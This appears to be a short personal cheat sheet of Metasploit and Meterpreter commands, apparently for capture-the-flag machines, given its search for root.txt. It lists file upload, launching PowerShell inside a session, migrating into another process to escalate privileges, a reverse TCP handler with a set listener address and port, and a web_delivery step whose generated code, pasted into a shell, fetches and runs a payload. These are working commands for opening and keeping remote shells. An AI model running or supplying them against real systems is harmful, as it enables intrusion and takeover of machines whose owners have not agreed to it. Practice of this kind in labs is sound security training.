### Upload file
```
upload <filepath>
```

### Launch powershell from meterpreter
```
load powershell
powershell_shell
Prompt changes to:
PS > 
```

### Options
- unset an option:
`unset <option>`

### Migrating to a process
Used to escalate priveliges
```
ps

migrate <pid>
```

## Reverse TCP handler
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.14.23.1
set LPORT 5555 
run
```

## Get meterpreter from other shell
```
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set LHOST
set LPORT
set target 2
run

Paste generated code into running shell
```

### Meterpreter find file
```
search -f root.txt
```